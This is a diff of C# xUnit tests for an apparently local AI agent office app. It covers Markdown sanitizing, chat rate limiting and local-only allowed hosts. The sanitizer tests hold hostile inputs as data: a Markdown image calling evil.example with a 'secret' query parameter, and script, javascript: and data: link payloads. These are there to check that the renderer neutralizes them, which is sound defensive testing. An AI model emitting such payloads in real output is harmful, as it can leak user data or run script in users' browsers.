@@ -111,7 +111,7 @@ public class SafeMarkdownTests
     [Fact]
     public void Images_are_never_loaded_only_their_alt_text_is_shown()
     {
-        var html = SafeMarkdown.ToHtml("Texto ![logo](https://evil.example/p.png?datos=secreto) fin");
+        var html = new SafeMarkdownRenderer().ToHtml("Texto ![logo](https://evil.example/p.png?datos=secreto) fin");
 
         Assert.DoesNotContain("<img", html);
         Assert.DoesNotContain("evil.example", html);
@@ -121,7 +121,7 @@ public class SafeMarkdownTests
     [Fact]
     public void Raw_html_and_unsafe_links_are_neutralized_and_safe_links_survive()
     {
-        var html = SafeMarkdown.ToHtml("<script>alert(1)</script> [a](javascript:alert(1)) [b](https://ok.example) [c](data:text/html,x)");
+        var html = new SafeMarkdownRenderer().ToHtml("<script>alert(1)</script> [a](javascript:alert(1)) [b](https://ok.example) [c](data:text/html,x)");
 
         Assert.DoesNotContain("<script", html);
         Assert.DoesNotContain("javascript:", html);
@@ -224,5 +224,67 @@ public class LocalChoiceHandlingTests
 
         Assert.Contains("No hay ningún caso esperando", result.Reply);
         Assert.Empty(h.Anthropic.Requests);
+    }
+}
+
+/// <summary>RF-006: límite de peticiones al chat (429) con la misma política que usa la API.</summary>
+public sealed class RateLimitTests : IAsyncLifetime
+{
+    private WebApplication _app = null!;
+    private HttpClient _http = null!;
+
+    public async Task InitializeAsync()
+    {
+        var builder = WebApplication.CreateBuilder();
+        builder.WebHost.UseUrls("http://127.0.0.1:0");
+        builder.Configuration["Office:ChatRequestsPerMinute"] = "3";
+        builder.Services.AddOfficeRateLimiting(builder.Configuration);
+        _app = builder.Build();
+        _app.UseRateLimiter();
+        _app.MapPost("/api/chat", () => "ok").RequireRateLimiting(OfficeApiExtensions.ChatRateLimitPolicy);
+        _app.MapGet("/api/office/state", () => "estado");
+        await _app.StartAsync();
+        _http = new HttpClient { BaseAddress = new Uri(_app.Urls.First()) };
+    }
+
+    public async Task DisposeAsync()
+    {
+        _http.Dispose();
+        await _app.StopAsync();
+        await _app.DisposeAsync();
+    }
+
+    [Fact]
+    public async Task Chat_requests_beyond_the_limit_get_429_while_other_endpoints_are_unaffected()
+    {
+        var codes = new List<HttpStatusCode>();
+        for (var i = 0; i < 5; i++) codes.Add((await _http.PostAsync("/api/chat", null)).StatusCode);
+
+        Assert.Equal(3, codes.Count(c => c == HttpStatusCode.OK));
+        Assert.Equal(2, codes.Count(c => c == HttpStatusCode.TooManyRequests));
+        Assert.Equal(HttpStatusCode.OK, (await _http.GetAsync("/api/office/state")).StatusCode);
+    }
+}
+
+/// <summary>RF-010: ambos hosts aceptan solo nombres de host locales.</summary>
+public class AllowedHostsTests
+{
+    private static string Find(string relative)
+    {
+        var dir = new DirectoryInfo(AppContext.BaseDirectory);
+        while (dir is not null && !File.Exists(Path.Combine(dir.FullName, relative))) dir = dir.Parent;
+        return Path.Combine(dir!.FullName, relative);
+    }
+
+    [Theory]
+    [InlineData("src/AI.Agent.Office.Api/appsettings.json")]
+    [InlineData("src/AI.Agent.Office.Web/appsettings.json")]
+    public void Both_hosts_restrict_AllowedHosts_to_local_names(string file)
+    {
+        using var doc = System.Text.Json.JsonDocument.Parse(File.ReadAllText(Find(file)));
+        var hosts = doc.RootElement.GetProperty("AllowedHosts").GetString()!;
+
+        Assert.NotEqual("*", hosts);
+        Assert.All(hosts.Split(';'), h => Assert.Contains(h, new[] { "localhost", "127.0.0.1", "[::1]" }));
     }
 }
